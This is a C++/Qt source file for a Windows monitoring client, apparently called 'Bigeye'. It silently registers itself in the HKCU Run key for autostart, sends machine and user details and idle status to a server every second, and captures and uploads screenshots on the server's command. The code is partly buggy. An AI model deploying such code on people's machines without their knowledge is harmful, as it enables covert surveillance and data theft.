#include "ClientServer.h"

ClientServer::ClientServer()
{
#ifdef Q_OS_WIN32
	QSettings settings("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
	settings.setValue("Bigeye", QDir::toNativeSeparators(QCoreApplication::applicationFilePath()));
	settings.sync();
#endif
	bool is_connected = 0;
	while (!is_connected)
		is_connected = connect_to_server();
	timer = new QTimer();
	timer->setInterval(1000);
	connect(timer, SIGNAL(timeout()), this, SLOT(updateTime()));
	timer->start();
	send_to_server(get_all_info());
	connect(socket, SIGNAL(bytesWritten(qint64)), this, SLOT(onBytesWritten(qint64)));
}

bool ClientServer::connect_to_server()
{
	socket = new QTcpSocket(this);
	connect(socket, &QTcpSocket::readyRead, this, &ClientServer::readyRead);
	connect(socket, &QTcpSocket::disconnected, this, &ClientServer::deleteLater);
	next_block_size = 0;
	socket->connectToHost(ip_address, PORT);
	if (socket->waitForConnected()) {
		if (socket->isOpen()) {
			qDebug() << "Connect";
		}
	}
	else {
		qDebug() << "Not connecting";
	}
	send_to_server(get_all_info());
	return (socket->state() == QTcpSocket::ConnectedState);
}

void ClientServer::onBytesWritten(qint64 bytes)
{

}

void ClientServer::readyRead()
{
	QDataStream in(socket);
	in.setVersion(QDataStream::Qt_6_5);
	if (in.status() == QDataStream::Ok)
	{
		while (true)
		{
			if (next_block_size == 0)
			{
				if (socket->bytesAvailable() < 2) break;
				in >> next_block_size;
			}
			if (socket->bytesAvailable() < next_block_size) break;
			in >> js_inpkg;
			next_block_size = 0;

			if (js_inpkg["TYPE"] == "GETSCREENSHOT")
			{
				is_screenshot = true;
				qDebug() << "GETSCREENSHOT";
				//send_to_server("C:\\Users\\Simon\\Desktop\\Client1\\ClientServer\\ClientServer\\test.txt");
			}
				
		}
	}
}

void ClientServer::send_to_server(const QJsonObject& js_pkg)
{
	data.clear();
	QDataStream out(&data, QIODevice::ReadWrite);
	out.setVersion(QDataStream::Qt_6_5);
	qint64 data_size = js_inpkg.size();
	QString type = "JSON";
	out << quint64(0)  << type << data_size<< js_pkg;
	out.device()->seek(0);
	//out << (quint64)(data.size() - sizeof(quint64));
	socket->write(data);
}

void ClientServer::send_to_server(QString name)
{
	data.clear();
	QDataStream out(&data, QIODevice::WriteOnly);
	out.setVersion(QDataStream::Qt_6_5);
	qint64 file_size;
	QString type = "FILE";
	QFile file(name);
	file.open(QIODeviceBase::ReadOnly);
	file_size = file.readAll().size();
	file.close();
	if (file.isOpen())
		file.close();
	out << quint64(0) << type << file_size;
	out.device()->seek(0);
	out << (quint64)(data.size() - sizeof(quint64));
	file.open(QIODeviceBase::ReadOnly);
	qint64 len = 0;
	qint64 send_size = 0;
	qint64 len_line = 0;
	do
	{
		data.clear();
		QDataStream out1(&data, QIODevice::WriteOnly);
		out1.setVersion(QDataStream::Qt_6_5);
		char buf[1024] = { 0 };
		len = 0;
		len = file.read(buf, sizeof(buf));
		qDebug() << "len=" << len;
		send_size += len;
		QByteArray bytes(buf, len);
		out1 << quint64(0) << type << bytes;
		out1.device()->seek(0);
		out1 << (quint64)(data.size() - sizeof(quint64));
		
		socket->write(data);
	} while (len > 0);
	qDebug() << "send_size=" << send_size;
	qDebug() << "file_size=" << file_size;
	file.close();
}

QJsonObject ClientServer::get_user_info()
{
	QString localhost_name = QHostInfo::localHostName();
	QString localhost_ip;
	QList<QHostAddress> host_list = QHostInfo::fromName(localhost_name).addresses();
	for(const QHostAddress & address : host_list) {
		if (address.protocol() == QAbstractSocket::IPv4Protocol && address.isLoopback() == false) {
			localhost_ip = address.toString();
		}
	}
	QString local_mac_address;
	for(const QNetworkInterface & networkInterface: QNetworkInterface::allInterfaces()) {
		for(const QNetworkAddressEntry & entry : networkInterface.addressEntries()) {
			if (entry.ip().toString() == localhost_ip) {
				local_mac_address = networkInterface.hardwareAddress();
				break;
			}
		}
	}
	QString username = QDir::home().dirName();
	QJsonObject out_pkg =
	{
		{"TYPE", "USERINFO"},
		{"MAC", local_mac_address},
		{"LOCALHOSTNAME", localhost_name},
		{"IP", localhost_ip},
		{"USER", username}
	};

	return out_pkg;
}

QString ClientServer::make_screenshot()
{
	HDC desktopDC = GetDC(NULL);

	HDC screenshotDC = CreateCompatibleDC(desktopDC);

	int screenWidth = GetSystemMetrics(SM_CXSCREEN);
	int screenHeight = GetSystemMetrics(SM_CYSCREEN);

	HBITMAP screenshotBitmap = CreateCompatibleBitmap(desktopDC, screenWidth, screenHeight);

	SelectObject(screenshotDC, screenshotBitmap);

	BitBlt(screenshotDC, 0, 0, screenWidth, screenHeight, desktopDC, 0, 0, SRCCOPY);

	HBITMAP hBitmap = (HBITMAP)GetCurrentObject(screenshotDC, OBJ_BITMAP);
	BITMAP bitmap;
	GetObject(hBitmap, sizeof(BITMAP), &bitmap);
	BITMAPFILEHEADER bmfHeader;
	BITMAPINFOHEADER bi;
	bi.biSize = sizeof(BITMAPINFOHEADER);
	bi.biWidth = bitmap.bmWidth;
	bi.biHeight = bitmap.bmHeight;
	bi.biPlanes = 1;
	bi.biBitCount = 24;
	bi.biCompression = BI_RGB;
	bi.biSizeImage = 0;
	bi.biXPelsPerMeter = 0;
	bi.biYPelsPerMeter = 0;
	bi.biClrUsed = 0;
	bi.biClrImportant = 0;
	DWORD dwBmpSize = ((bitmap.bmWidth * bi.biBitCount + 31) / 32) * 4 * bitmap.bmHeight;
	HANDLE hDIB = GlobalAlloc(GHND, dwBmpSize);
	char* lpbitmap = (char*)GlobalLock(hDIB);
	GetDIBits(screenshotDC, hBitmap, 0, (UINT)bitmap.bmHeight, lpbitmap, (BITMAPINFO*)&bi, DIB_RGB_COLORS);

	// Открываем файл для записи
	FILE* file;
	fopen_s(&file, "screenshot.bmp", "wb");

	// Записываем заголовки BMP файла
	DWORD dwSizeofDIB = dwBmpSize + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
	bmfHeader.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER);
	bmfHeader.bfSize = dwSizeofDIB;
	bmfHeader.bfType = 0x4D42; // Буквы 'BM'
	fwrite(&bmfHeader, sizeof(BITMAPFILEHEADER), 1, file);
	fwrite(&bi, sizeof(BITMAPINFOHEADER), 1, file);

	// Записываем данные скриншота
	fwrite(lpbitmap, dwBmpSize, 1, file);

	// Закрываем файл и освобождаем память
	fclose(file);
	GlobalUnlock(hDIB);
	GlobalFree(hDIB);

	// Освобождаем ресурсы
	DeleteObject(screenshotBitmap);
	DeleteDC(screenshotDC);
	ReleaseDC(NULL, desktopDC);
	
	return "screenshot.bmp";
}

QJsonObject ClientServer::get_all_info()
{
	QJsonObject js_outpkg = get_user_info();
	js_outpkg["ACTIVITY"] = !is_sleep();
	js_outpkg["TIME"] = QTime::currentTime().toString("HH:mm:ss");
	return js_outpkg;
}

void ClientServer::updateTime()
{
	if (is_screenshot)
	{
		send_to_server(make_screenshot());
		is_screenshot = false;
		return;
	}
	send_to_server(get_all_info());
}

bool ClientServer::is_sleep()
{
	LASTINPUTINFO last_input_info;
	last_input_info.cbSize = sizeof(LASTINPUTINFO);
	// Получаем информацию о последнем пользовательском вводе
	GetLastInputInfo(&last_input_info);

	// Получаем текущее время
	DWORD current_time = GetTickCount();

	// Вычисляем время бездействия пользователя в миллисекундах
	DWORD idleTime = current_time - last_input_info.dwTime;

	//// Проверяем, если время бездействия больше определенного значения (например, 5 минут)
	//if (idleTime > 5 * 60 * 1000) {
	//	qDebug() << "User sleeping!";
	//	qDebug() << "Time:\t" << QTime::currentTime().toString("HH:mm:ss");
	//}
	//else
	//{
	//	qDebug() << "User working!";
	//	qDebug() << "Time:\t" << QTime::currentTime().toString("HH:mm:ss");
	//}
	return (idleTime > 5 * 60 * 1000);
}

void ClientServer::deleteLater()
{
	bool is_connected = 0;
	while (!is_connected)
		is_connected = connect_to_server();
}